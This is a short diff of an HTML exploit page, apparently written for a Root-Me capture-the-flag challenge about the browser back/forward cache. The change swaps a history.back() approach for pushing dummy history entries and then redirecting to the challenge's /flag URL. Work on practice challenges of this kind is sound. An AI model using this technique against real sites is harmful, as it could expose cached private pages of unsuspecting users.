@@ -9,26 +9,23 @@
     }
 
     window.addEventListener('load', () => {
-      log('load - go directly to /flag');
+      log('load - prepare history');
+      
+
+      history.pushState({}, '', '/dummy1');
+      history.pushState({}, '', '/dummy2');
       
       setTimeout(() => {
         log('go to /flag');
-        location.href = 'http://challenge01.root-me.org:58007/flag'; 
-      }, 500);
+        location.href = 'http://challenge01.root-me.org:58007/flag';
+      }, 1000); 
     });
 
-    window.addEventListener('pageshow', (event) => {
-      log('pageshow, persisted=' + event.persisted);
-      
-      setTimeout(() => {
-        log('history.back()');
-        history.back();
-      }, 500);
-    });
+
   </script>
 </head>
 <body>
-  <h1 style="font-size:40px; color:red;">BFCache DIRECT</h1>
-  <p style="font-size:24px;">Status: <span id="status" style="color:blue;">LOADING...</span></p>
+  <h1 style="font-size:40px; color:orange;">BFCACHE HISTORY</h1>
+  <p style="font-size:24px;">Status: <span id="status" style="color:blue;">PREPARING...</span></p>
 </body>
 </html>
